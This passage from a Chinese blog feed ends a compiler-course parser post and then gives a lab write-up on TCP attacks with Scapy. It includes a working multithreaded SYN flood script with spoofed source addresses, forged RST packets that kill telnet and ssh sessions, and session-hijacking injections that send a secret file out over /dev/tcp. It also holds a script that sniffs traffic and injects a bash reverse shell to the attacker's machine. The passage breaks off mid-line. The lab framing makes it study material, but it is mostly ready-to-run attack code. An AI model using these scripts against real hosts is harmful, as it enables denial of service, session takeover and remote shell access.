class="line">	<span class="keyword">if</span> ( lookahead == LEFT_BRACKET )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(YELLOW <span class="string">"Production:  factor   →  ( expr )\n"</span> NONE);</span><br><span class="line">		match( LEFT_BRACKET );</span><br><span class="line">		Expr();</span><br><span class="line">		match( RIGHT_BRACKET );</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> ( lookahead == ID_TKN )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(YELLOW <span class="string">"Production:  factor   →  id\n"</span> NONE);</span><br><span class="line">		match( lookahead );</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> ( lookahead == NUM_TKN )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(YELLOW <span class="string">"Production:  factor   →  num\n"</span> NONE);</span><br><span class="line">		match( lookahead );</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(RED <span class="string">"Factor error"</span> NONE);</span><br><span class="line">	error();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//system("cls");//window下输出颜色</span></span><br><span class="line">    <span class="keyword">char</span> filename[<span class="number">1000</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入要编译的源程序文件名："</span>); gets(filename);</span><br><span class="line">    BeginCompileOneFile( filename );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//当flex扫描到文件末尾，yylex函数返回0</span></span><br><span class="line">    lookahead = yylex();</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*调用Program()开始句法分析,Program是文法的起始符号*/</span></span><br><span class="line">    Program();</span><br><span class="line"></span><br><span class="line">    EndCompileOneFile();</span><br><span class="line">    </span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">	system(<span class="string">"pause"</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="编译运行"><a href="#编译运行" class="headerlink" title="编译运行"></a>编译运行</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">$ flex clang.lex</span><br><span class="line">$ gcc parser.cpp lex.yy.c -o parser</span><br></pre></td></tr></table></figure></div>
<p>b.txt内容</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	   i = <span class="number">2</span>;</span><br><span class="line">       sum = <span class="number">0</span>;</span><br><span class="line">	   <span class="keyword">while</span> (i &lt;=<span class="number">100</span>) 	&#123;</span><br><span class="line">	   	   sum = sum + i;</span><br><span class="line">		   i = i + <span class="number">2</span>;</span><br><span class="line">	   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>运行</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">$ parser</span><br><span class="line">请输入要编译的源程序文件名：b.txt</span><br><span class="line">LEFT_BIBRACKET:&#123;</span><br><span class="line">Production:  program   →  block</span><br><span class="line">Production:  block   →  &#123; stmts &#125;</span><br><span class="line">ID:i</span><br><span class="line">Production:  stmts   →  stmt stmts</span><br><span class="line">Production:  stmt   →  id &#x3D; expr;</span><br><span class="line">EQ:&#x3D;</span><br><span class="line">Num:2</span><br><span class="line">Production:  expr   →  term expr&#39;</span><br><span class="line">Production:  term   →  factor term&#39;</span><br><span class="line">Production:  factor   →  num</span><br><span class="line">SENI:;</span><br><span class="line">Production:  term&#39;   →  ε</span><br><span class="line">Production:  expr&#39;   →  ε</span><br><span class="line">ID:sum</span><br><span class="line">Production:  stmts   →  stmt stmts</span><br><span class="line">Production:  stmt   →  id &#x3D; expr;</span><br><span class="line">EQ:&#x3D;</span><br><span class="line">Num:0</span><br><span class="line">Production:  expr   →  term expr&#39;</span><br><span class="line">Production:  term   →  factor term&#39;</span><br><span class="line">Production:  factor   →  num</span><br><span class="line">SENI:;</span><br><span class="line">Production:  term&#39;   →  ε</span><br><span class="line">Production:  expr&#39;   →  ε</span><br><span class="line">WHILE:while</span><br><span class="line">Production:  stmts   →  stmt stmts</span><br><span class="line">Production:  stmt   →  while (bool) stmt</span><br><span class="line">LEFT_BRACKET:(</span><br><span class="line">ID:i</span><br><span class="line">Production:  expr   →  term expr&#39;</span><br><span class="line">Production:  term   →  factor term&#39;</span><br><span class="line">Production:  factor   →  id</span><br><span class="line">LE:&lt;&#x3D;</span><br><span class="line">Production:  term&#39;   →  ε</span><br><span class="line">Production:  expr&#39;   →  ε</span><br><span class="line">bool   →  expr relop expr</span><br><span class="line">Num:100</span><br><span class="line">Production:  expr   →  term expr&#39;</span><br><span class="line">Production:  term   →  factor term&#39;</span><br><span class="line">Production:  factor   →  num</span><br><span class="line">RIGHT_BRACKET:)</span><br><span class="line">Production:  term&#39;   →  ε</span><br><span class="line">Production:  expr&#39;   →  ε</span><br><span class="line">LEFT_BIBRACKET:&#123;</span><br><span class="line">stmt   →  block</span><br><span class="line">Production:  block   →  &#123; stmts &#125;</span><br><span class="line">ID:sum</span><br><span class="line">Production:  stmts   →  stmt stmts</span><br><span class="line">Production:  stmt   →  id &#x3D; expr;</span><br><span class="line">EQ:&#x3D;</span><br><span class="line">ID:sum</span><br><span class="line">Production:  expr   →  term expr&#39;</span><br><span class="line">Production:  term   →  factor term&#39;</span><br><span class="line">Production:  factor   →  id</span><br><span class="line">AD:+</span><br><span class="line">Production:  term&#39;   →  ε</span><br><span class="line">Production:  expr&#39;   →  + term expr&#39;</span><br><span class="line">ID:i</span><br><span class="line">Production:  term   →  factor term&#39;</span><br><span class="line">Production:  factor   →  id</span><br><span class="line">SENI:;</span><br><span class="line">Production:  term&#39;   →  ε</span><br><span class="line">Production:  expr&#39;   →  ε</span><br><span class="line">ID:i</span><br><span class="line">Production:  stmts   →  stmt stmts</span><br><span class="line">Production:  stmt   →  id &#x3D; expr;</span><br><span class="line">EQ:&#x3D;</span><br><span class="line">ID:i</span><br><span class="line">Production:  expr   →  term expr&#39;</span><br><span class="line">Production:  term   →  factor term&#39;</span><br><span class="line">Production:  factor   →  id</span><br><span class="line">AD:+</span><br><span class="line">Production:  term&#39;   →  ε</span><br><span class="line">Production:  expr&#39;   →  + term expr&#39;</span><br><span class="line">Num:2</span><br><span class="line">Production:  term   →  factor term&#39;</span><br><span class="line">Production:  factor   →  num</span><br><span class="line">SENI:;</span><br><span class="line">Production:  term&#39;   →  ε</span><br><span class="line">Production:  expr&#39;   →  ε</span><br><span class="line">RIGHT_BIBRACKET:&#125;</span><br><span class="line">Production:  stmts   →  ε</span><br><span class="line">RIGHT_BIBRACKET:&#125;</span><br><span class="line">Production:  stmts   →  ε</span><br><span class="line"></span><br><span class="line">请按任意键继续. . .</span><br></pre></td></tr></table></figure></div>
<p>完成语法分析</p>
]]></content>
      <categories>
        <category>编译原理</category>
      </categories>
  </entry>
  <entry>
    <title>scapy实现TCP Attacks</title>
    <url>/posts/5acb07a3/</url>
    <content><![CDATA[<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><ul>
<li>Task1. SYN Flooding Attack<br>用Scapy构造SYN包，观察攻击效果，解释现象及原因。</li>
<li>Task2.TCP RST Attacks on telnet and ssh Connections<br>应用Scapy，解释需要构造报文中的关键数据及其值获取</li>
<li>Task3.TCP Session Hijacking<br>回显主机上的文件（自行取）内容。在受害机上Wireshark观察劫持后，与服务器的TCP通信信息，解释原因。</li>
<li>Task4.Creating Reverse Shell using TCP Hijacking<br>将受害主机外壳反弹至攻击机<a id="more"></a></li>
</ul>
<h1 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h1><h2 id="实验配置"><a href="#实验配置" class="headerlink" title="实验配置"></a>实验配置</h2><p>攻击机：            kali-linux-2019  192.168.2.207 </p>
<p>靶机A(server): SEEDUbuntu16 192.168.2.101  </p>
<p>靶机B(client):  SEEDUbuntu16 192.168.2.121   </p>
<h2 id="SYN-Flooding-Attack"><a href="#SYN-Flooding-Attack" class="headerlink" title="SYN Flooding Attack"></a>SYN Flooding Attack</h2><p>实验代码:</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">logging.getLogger(<span class="string">'scapy.runtime'</span>).setLevel(logging.ERROR)</span><br><span class="line"></span><br><span class="line">cpu_count = multiprocessing.cpu_count()</span><br><span class="line">total_packets = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_syn_packet</span><span class="params">(ip, port)</span>:</span></span><br><span class="line">    ip_layer = IP()</span><br><span class="line">    tcp_layer = TCP()</span><br><span class="line"></span><br><span class="line">    ip_layer.src = <span class="string">'%i.%i.%i.%i'</span> %(</span><br><span class="line">         random.randint(<span class="number">1</span>, <span class="number">254</span>),</span><br><span class="line">         random.randint(<span class="number">1</span>, <span class="number">254</span>),</span><br><span class="line">         random.randint(<span class="number">1</span>, <span class="number">254</span>),</span><br><span class="line">         random.randint(<span class="number">1</span>, <span class="number">254</span>))  <span class="comment">#随机IP地址</span></span><br><span class="line">    tcp_layer.sport = random.randint(<span class="number">1</span>, <span class="number">65535</span>)</span><br><span class="line">    <span class="comment">#随机端口</span></span><br><span class="line">    tcp_layer.flags = <span class="string">'S'</span>  <span class="comment">#flag设置为syn</span></span><br><span class="line"></span><br><span class="line">    ip_layer.dst = ip</span><br><span class="line">    tcp_layer.dport = port</span><br><span class="line"></span><br><span class="line">    send(ip_layer / tcp_layer, verbose=<span class="number">0</span>)</span><br><span class="line">    <span class="comment">#verbose=0表示不输出中间结果</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">syn_flood</span><span class="params">(ip, port)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> total_packets</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:  <span class="comment">#循环发送</span></span><br><span class="line">        send_syn_packet(ip, port)</span><br><span class="line">        total_packets += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> total_packets % <span class="number">100</span> == <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">'Total packets: %i'</span> % total_packets)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">4</span>:</span><br><span class="line">        print(<span class="string">'%s &lt;Interface&gt; &lt;Target IP&gt; &lt;Target port&gt;'</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">'Flooding is started...'</span>)</span><br><span class="line"></span><br><span class="line">    conf.iface = sys.argv[<span class="number">1</span>]  <span class="comment">#网卡接口</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#多线程提高发送速度</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(cpu_count):</span><br><span class="line">        threading.Thread(target=syn_flood,</span><br><span class="line">                         args=(sys.argv[<span class="number">2</span>], int(sys.argv[<span class="number">3</span>]))).start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div>
<p>对于靶机A：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">sudo sysctl -w net.ipv4.tcp_syncookies=0  #关闭syn cookies防御机制</span><br><span class="line">sudo sysctl -w net.ipv4.tcp_max_syn_backlog=128 #设置tcp连接队列长度backlog为小数值，使实验现象更明显</span><br></pre></td></tr></table></figure></div>
<p>kali攻击机运行synflood.py，攻击靶机A的23端口</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">python3 synflood.py eth0 192.168.2.101 23</span><br></pre></td></tr></table></figure></div>
<p><img src="/images/loading.gif" data-original="/posts/5acb07a3/image-20200331202311177.png" alt="image-20200331202311177"></p>
<p>kali攻击机抓包：</p>
<p><img src="/images/loading.gif" data-original="/posts/5acb07a3/image-20200331202407197.png" alt="image-20200331202407197"></p>
<p>靶机A抓包：</p>
<p><img src="/images/loading.gif" data-original="/posts/5acb07a3/image-20200331202523171.png" alt="image-20200331202523171"></p>
<p>查看端口连接：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">netstat -tna</span><br></pre></td></tr></table></figure></div>
<p>可以看出有大量的SYN_RECV状态</p>
<p><img src="/images/loading.gif" data-original="/posts/5acb07a3/image-20200331202739638.png" alt="image-20200331202739638"></p>
<p>靶机B 对 靶机A发起TCP连接</p>
<p><img src="/images/loading.gif" data-original="/posts/5acb07a3/image-20200331203147266.png" alt="image-20200331203147266"></p>
<p>无法连接</p>
<h3 id="现象及原因解释"><a href="#现象及原因解释" class="headerlink" title="现象及原因解释"></a>现象及原因解释</h3><p><strong>TCP有限状态机图</strong></p>
<p><img src="/images/loading.gif" data-original="/posts/5acb07a3/image-20200322212016601.png" alt="img"></p>
<p>当靶机A收到SYN后，会进入SYN_RCVD状态，并发送SYN，ACK等待攻击机的ACK（第三次握手），处于半连接状态</p>
<p><img src="/images/loading.gif" data-original="/posts/5acb07a3/image-20200401105811910.png" alt="image-20200401105811910"></p>
<p>然而kali攻击机向靶机A发送大量的SYN包，使靶机A打开大量的半开连接，分配TCB缓存，从而消耗大量的内存资源，同时也使得正常的连接（靶机B向靶机A发起的telnet）请求无法被响应，造成了DOS攻击。</p>
<p>关闭攻击机的SYN Flood攻击<br>再次发起连接</p>
<p><img src="/images/loading.gif" data-original="/posts/5acb07a3/image-20200331203254919.png" alt="image-20200331203254919"></p>
<p>连接成功</p>
<h2 id="TCP-RST-Attacks"><a href="#TCP-RST-Attacks" class="headerlink" title="TCP RST Attacks"></a>TCP RST Attacks</h2><h3 id="telnet-Connections"><a href="#telnet-Connections" class="headerlink" title="telnet Connections"></a>telnet Connections</h3><p>靶机B向靶机A发起telnet连接</p>
<p><img src="/images/loading.gif" data-original="/posts/5acb07a3/image-20200331212705785.png" alt="image-20200331212705785"></p>
<p>A开启wireshark接受信息，最后一个tcp报文如下图</p>
<p><img src="/images/loading.gif" data-original="/posts/5acb07a3/image-20200331213144875.png" alt="image-20200331213144875"></p>
<p>攻击机用scapy伪造如下RST报文，与最后一个报文各项数据均相同，仅有flags为’R’</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;IPLayer=IP(src=<span class="string">'192.168.2.121'</span>,dst=<span class="string">'192.168.2.101'</span>)</span><br><span class="line">&gt;&gt;&gt;TCPLayer=TCP(sport=<span class="number">39966</span>,dport=<span class="number">23</span>,flags=<span class="string">'R'</span>,seq=<span class="number">3662400054</span>)</span><br><span class="line">&gt;&gt;&gt;pkt=IPLayer/TCPLayer</span><br><span class="line">&gt;&gt;&gt;ls(pkt)</span><br><span class="line">&gt;&gt;&gt;send(pkt,verbose=<span class="number">0</span>)</span><br></pre></td></tr></table></figure></div>
<p><img src="/images/loading.gif" data-original="/posts/5acb07a3/image-20200331214820722.png" alt="image-20200331214820722"></p>
<p>259为攻击机发送给靶机A的报文</p>
<p>当靶机B再次往telnet键入信息</p>
<p>靶机A接收到了报文260，但是A发送了RST报文261强制关闭连接 </p>
<p>靶机B出现如下结果</p>
<p><img src="/images/loading.gif" data-original="/posts/5acb07a3/image-20200331215229928.png" alt="image-20200331215229928"></p>
<p>攻击成功</p>
<h3 id="ssh-Connections"><a href="#ssh-Connections" class="headerlink" title="ssh Connections"></a>ssh Connections</h3><p>用同样的方法断开ssh连接</p>
<p>靶机B向靶机A发起连接</p>
<p><img src="/images/loading.gif" data-original="/posts/5acb07a3/image-20200331215624510.png" alt="image-20200331215624510"></p>
<p>靶机A的末报文</p>
<p><img src="/images/loading.gif" data-original="/posts/5acb07a3/image-20200331215813657.png" alt="image-20200331215813657"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;IPLayer=IP(src=<span class="string">'192.168.2.121'</span>,dst=<span class="string">'192.168.2.101'</span>)</span><br><span class="line">&gt;&gt;&gt;TCPLayer=TCP(sport=<span class="number">60890</span>,dport=<span class="number">22</span>,flags=<span class="string">'R'</span>,seq=<span class="number">34032852</span>)</span><br><span class="line">&gt;&gt;&gt;pkt=IPLayer/TCPLayer</span><br><span class="line">&gt;&gt;&gt;ls(pkt)</span><br><span class="line">&gt;&gt;&gt;send(pkt,verbose=<span class="number">0</span>)</span><br></pre></td></tr></table></figure></div>
<p>攻击机向靶机A发送了RST报文101</p>
<p><img src="/images/loading.gif" data-original="/posts/5acb07a3/image-20200331220033722.png" alt="image-20200331220033722"></p>
<p>当靶机B再次往ssh键入信息</p>
<p>靶机A接收到了报文103，但是A发送了RST报文104强制关闭连接 </p>
<p>靶机B出现如下结果</p>
<p><img src="/images/loading.gif" data-original="/posts/5acb07a3/image-20200331220316492.png" alt="image-20200331220316492"></p>
<p>攻击成功</p>
<h2 id="TCP-Session-Hijacking"><a href="#TCP-Session-Hijacking" class="headerlink" title="TCP Session Hijacking"></a>TCP Session Hijacking</h2><p>使用netcat实现</p>
<p>靶机A下有个secret文件</p>
<p><img src="/images/loading.gif" data-original="/posts/5acb07a3/image-20200331221502518.png" alt="image-20200331221502518"></p>
<p>靶机B输入</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">nc -lv 9090</span><br></pre></td></tr></table></figure></div>
<p><img src="/images/loading.gif" data-original="/posts/5acb07a3/image-20200331221625653.png" alt="image-20200331221625653"></p>
<p>靶机A输入</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;home&#x2F;seed&#x2F;secret  &gt; &#x2F;dev&#x2F;tcp&#x2F;192.168.2.121&#x2F;9090</span><br></pre></td></tr></table></figure></div>
<p>之后靶机A显示</p>
<p><img src="/images/loading.gif" data-original="/posts/5acb07a3/image-20200331223556494.png" alt="image-20200331223556494"></p>
<p>信息被重定向至靶机A的9090端口</p>
<p>利用上述原理通过scapy劫持靶机B与A之间的telnet通信</p>
<p>靶机B向靶机A发起telnet连接，在A端收到的最后一个TCP报文如下</p>
<p><img src="/images/loading.gif" data-original="/posts/5acb07a3/image-20200331225425727.png" alt="image-20200331225425727"></p>
<p>靶机B首先打开9090端口，新开终端键入</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">nc -lv 9090</span><br></pre></td></tr></table></figure></div>
<p>攻击机伪造如下报文</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;IPLayer&#x3D;IP(src&#x3D;&#39;192.168.2.121&#39;,dst&#x3D;&#39;192.168.2.101&#39;)</span><br><span class="line">&gt;&gt;&gt;TCPLayer&#x3D;TCP(sport&#x3D;39976,dport&#x3D;23,flags&#x3D;&#39;A&#39;,seq&#x3D;2852050381,ack&#x3D;3692652982)</span><br><span class="line">&gt;&gt;&gt;Data&#x3D;&#39;\r cat &#x2F;home&#x2F;seed&#x2F;secret  &gt; &#x2F;dev&#x2F;tcp&#x2F;192.168.2.121&#x2F;9090\r&#39;</span><br><span class="line">&gt;&gt;&gt;pkt&#x3D;IPLayer&#x2F;TCPLayer&#x2F;Data</span><br><span class="line">&gt;&gt;&gt;ls(pkt)</span><br><span class="line">&gt;&gt;&gt;send(pkt,verbose&#x3D;0)</span><br></pre></td></tr></table></figure></div>
<p><img src="/images/loading.gif" data-original="/posts/5acb07a3/image-20200331225630605.png" alt="image-20200331225630605"></p>
<p>发送后</p>
<p>靶机A产生如下报文</p>
<p><img src="/images/loading.gif" data-original="/posts/5acb07a3/image-20200331225748368.png" alt="image-20200331225748368"></p>
<p>在靶机B处得到回显数据</p>
<p><img src="/images/loading.gif" data-original="/posts/5acb07a3/image-20200331225702790.png" alt="image-20200331225702790"></p>
<p>此时AB连接被迫断开</p>
<p>也可以重定向到kali攻击机</p>
<p>kali攻击机打开9090端口</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">nc -lvp 9090</span><br></pre></td></tr></table></figure></div>
<p>靶机A最后一个TCP报文</p>
<p><img src="/images/loading.gif" data-original="/posts/5acb07a3/image-20200331233710053.png" alt="image-20200331233710053"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;IPLayer=IP(src=<span class="string">'192.168.2.121'</span>,dst=<span class="string">'192.168.2.101'</span>)</span><br><span class="line">&gt;&gt;&gt;TCPLayer=TCP(sport=<span class="number">39982</span>,dport=<span class="number">23</span>,flags=<span class="string">'A'</span>,seq=<span class="number">2413686932</span>,ack=<span class="number">1131011684</span>)</span><br><span class="line">&gt;&gt;&gt;Data=<span class="string">'\r cat /home/seed/secret  &gt; /dev/tcp/192.168.2.207/9090\r'</span></span><br><span class="line">&gt;&gt;&gt;pkt=IPLayer/TCPLayer/Data</span><br><span class="line">&gt;&gt;&gt;ls(pkt)</span><br><span class="line">&gt;&gt;&gt;send(pkt,verbose=<span class="number">0</span>)</span><br></pre></td></tr></table></figure></div>
<p><img src="/images/loading.gif" data-original="/posts/5acb07a3/image-20200331233856924.png" alt="image-20200331233856924"></p>
<p>kali攻击机回显</p>
<p><img src="/images/loading.gif" data-original="/posts/5acb07a3/image-20200331233928089.png" alt="image-20200331233928089"></p>
<h3 id="原因解释"><a href="#原因解释" class="headerlink" title="原因解释"></a>原因解释</h3><p>本次实验的TCP会话劫持是利用中间人的方法</p>
<p><img src="/images/loading.gif" data-original="/posts/5acb07a3/session1.png" alt="img"></p>
<p><img src="/images/loading.gif" data-original="/posts/5acb07a3/session2.png" alt="img"></p>
<p>通过了解服务机的最后一个接收的ACK报文，攻击者（kali）伪造相同seq和ack的相似TCP报文， 使得服务器认为是正常的ACK报文并接收。 如果这个连接是Telnet会话，攻击者（kali攻击机）可以在该会话中注入恶意命令，导致受害者（服务机靶机A）执行恶意命令。通过重定向命令将受害者（靶机A）的命令执行内容重定向到攻击机，完成攻击。</p>
<h2 id="Creating-Reverse-Shell-using-TCP-Hijacking"><a href="#Creating-Reverse-Shell-using-TCP-Hijacking" class="headerlink" title="Creating Reverse Shell using TCP Hijacking"></a>Creating Reverse Shell using TCP Hijacking</h2><p>此实验仅需将Data换成<code>&#39;\r nohup /bin/bash -i &gt; /dev/tcp/&#39; + localIP + &#39;/9090 2&gt;&amp;1 0&lt;&amp;1\r&#39;</code>，其中localIP是kali机的IP，<code>/bin/bash</code>是linux机上的shell应用。</p>
<p>让kali攻击机作为中间人自动获取靶机A的ACK报文来伪造发送ACK报文，自动获得反弹shell。</p>
<p>resShell.py</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"><span class="keyword">import</span> netifaces</span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">__author__ = <span class="string">'Asymptotic_freedom'</span></span><br><span class="line"></span><br><span class="line">victimIP = <span class="literal">None</span></span><br><span class="line">localIP = <span class="literal">None</span></span><br><span class="line">localPort = <span class="literal">None</span></span><br><span class="line">haveSent = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">help_text</span><span class="params">()</span>:</span></span><br><span class="line">    print(</span><br><span class="line">        <span class="string">"\nUsage:\n python3 resShell.py &lt;Interface&gt; &lt;Target IP&gt; &lt;Local port&gt;\n"</span></span><br><span class="line">    )</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sniff(filter=<span class="string">'tcp'</span>, prn=resShell)</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">resShell</span><span class="params">(pkt)</span>:</span></span><br><span class="line">    <span class="string">'''反向shell，仅发送一次ack包'''</span></span><br><span class="line">    <span class="keyword">global</span> localIP, victimIP, localPort, haveSent</span><br><span class="line">    ipsrc = pkt[IP].src</span><br><span class="line">    ipdst = pkt[IP].dst</span><br><span class="line">    <span class="keyword">if</span> haveSent <span class="keyword">or</span> ipdst != victimIP <span class="keyword">or</span> pkt[</span><br><span class="line">            TCP].flags != <span class="string">'A'</span> <span class="keyword">or</span> ipsrc == localIP:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    haveSent = <span class="literal">True</span></span><br><span class="line">    print(<span class="string">"Have sent the hijacking packet: %s -&gt; %s ..."</span> % (ipsrc, ipdst))</span><br><span class="line">    tsp = pkt[TCP].sport</span><br><span class="line">    tdp = pkt[TCP].dport</span><br><span class="line">    tseq = pkt[TCP].seq</span><br><span class="line">    tack = pkt[TCP].ack</span><br><span class="line">    IPLayer = IP(src=ipsrc, dst=ipdst)</span><br><span class="line">    TCPLayer = TCP(sport=tsp, dport=tdp, flags=<span class="string">'A'</span>, seq=tseq, ack=tack)</span><br><span class="line">    Data = <span class="string">'\r nohup /bin/bash -i &gt; /dev/tcp/'</span> + localIP + <span class="string">'/'</span> + localPort + <span class="string">' 2&gt;&amp;1 0&lt;&amp;1 \r'</span></span><br><span class="line">    pkt = IPLayer / TCPLayer / Data</span><br><span class="line">    send(pkt, verbose=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> interface, victimIP, localPort, localIP</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">4</span>:</span><br><span class="line">        help_text()</span><br><span class="line">    interface = sys.argv[<span class="number">1</span>]</span><br><span class="line">    victimIP = sys.argv[<span class="number">2</span>]</span><br><span class="line">    localPort = sys.argv[<span class="number">3</span>]</span><br><span class="line">    localIP = netifaces.ifaddresses(interface)[<span class="number">2</span>][<span class="number">0</span>][<span class="string">'addr'</span>]</span><br><span class="line">    <span class="comment">#创建一个线程运行exploit()函数</span></span><br><span class="line">    th = threading.Thread(target=exploit)</span><br><span class="line">    th.setDaemon(<span class="literal">True</span>)  <span class="comment">#把当前进程设置为守护线程，主线程执行完毕，子线程均停止</span></span><br><span class="line">    th.start()</span><br><span class="line">    <span class="comment">#主线程运行</span></span><br><span class="line">    os.system(<span class="string">"nc 